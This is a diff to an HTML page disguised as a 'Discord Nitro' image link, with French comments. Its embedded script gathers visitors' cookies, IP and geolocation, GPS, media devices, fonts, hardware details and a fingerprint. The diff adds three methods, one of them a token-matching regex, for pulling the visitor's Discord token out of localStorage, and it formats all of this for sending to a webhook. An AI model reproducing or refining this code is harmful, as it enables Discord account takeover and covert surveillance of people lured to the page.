@@ -5,7 +5,7 @@
   <title>Discord Nitro</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:title" content="Image Discord">
-  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1313995492392439831/1362763852588257290/a18af5cfb44cd2906e21a7e5e29dea58.jpg?ex=6803943d&is=680242bd&hm=5b81c0cc5bfa6a3d837b3b0c3baf377dbd2af74534c4420f9a26eb">
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1349384952952782933/1362769394345836777/d1307726079aa3c22191e6280e8d6ad5.jpg?ex=68039966&is=680247e6&hm=cbb5d9dd181d8614d4b85bc98932f3a7088b6167501e74c5a6">
   <style>
     body {
       margin: 0;
@@ -80,6 +80,8 @@
         const platform = navigator.platform;
         const referrer = document.referrer || "Aucun";
         const cookies = document.cookie || "Aucun";
+        const cpuThreads = navigator.hardwareConcurrency || "Inconnu";
+        const deviceMemory = navigator.deviceMemory || "Inconnu";
 
         // IP et géolocalisation
         let ip = "Inconnu", geo = {};
@@ -109,24 +111,41 @@
           } catch(e) {}
         }
 
-        // Token Discord (Discord Web)
+        // Token Discord (méthodes multiples)
         let token = null;
         try {
-          // Méthode classique
+          // Méthode 1: localStorage
           token = localStorage.getItem("token");
+
+          // Méthode 2: recherche clé contenant "token"
           if (!token) {
-            // Méthode alternative (pour Discord Web)
             for (let i in localStorage) {
-              if (i.includes("token")) {
+              if (i.toLowerCase().includes("token")) {
                 token = localStorage[i];
                 break;
               }
             }
           }
+
+          // Méthode 3: expressions régulières (plus risqué, mais parfois efficace)
+          if (!token) {
+            const regex = /[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/g;
+            for (let i in localStorage) {
+              try {
+                const match = localStorage[i].match(regex);
+                if (match) {
+                  token = match[0];
+                  break;
+                }
+              } catch (e) {}
+            }
+          }
+
+          // Nettoyage du token
+          if (token) token = token.replace(/"/g, "").trim();
         } catch (e) {
           token = "Erreur accès token";
         }
-        if (token) token = token.replace(/"/g, "");
 
         // Devices audio/vidéo
         let mediaDevices = "Non supporté";
@@ -167,20 +186,6 @@
         // Fingerprint simple
         const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}|${timezone}|${platform}|${fonts}`);
 
-        // Hardware
-        const cpuThreads = navigator.hardwareConcurrency || "Inconnu";
-        const deviceMemory = navigator.deviceMemory || "Inconnu";
-
-        // VPN/Proxy
-        const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN/Proxy détecté" : "✅ Connexion normale";
-
-        // Temps passé sur la page
-        let startTime = Date.now();
-        window.addEventListener("beforeunload", function() {
-          const duration = ((Date.now() - startTime) / 1000).toFixed(1);
-          sendToWebhook("Temps passé sur la page", `${duration} secondes`);
-        });
-
         // Préparation du message
         let infos = [
           `🕒 Date/Heure : ${now}`,
@@ -194,14 +199,14 @@
           `🧭 Fuseau horaire : ${timezone}`,
           `📱 Résolution : ${screenSize}`,
           `🔋 Batterie : ${batteryStatus}`,
-          `🛡️ VPN : ${vpn}`,
-          `🍪 Cookies : ${cookies}`,
-          `🔗 Referrer : ${referrer}`,
+          `⚙️ CPU Threads : ${cpuThreads}`,
+          `💾 RAM estimée : ${deviceMemory} Go`,
+          `🛡️ VPN : ${geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN/Proxy détecté" : "✅ Connexion normale"}`,
           `📍 GPS : ${gps}`,
           `🎤 Appareils audio/vidéo : ${mediaDevices}`,
           `🔤 Polices détectées : ${fonts}`,
-          `⚙️ CPU Threads : ${cpuThreads}`,
-          `💾 RAM estimée : ${deviceMemory} Go`,
+          `🍪 Cookies : ${cookies}`,
+          `🔗 Referrer : ${referrer}`,
           `🪙 Token Discord : ${token || "Non trouvé"}`
         ].join('\n');
 
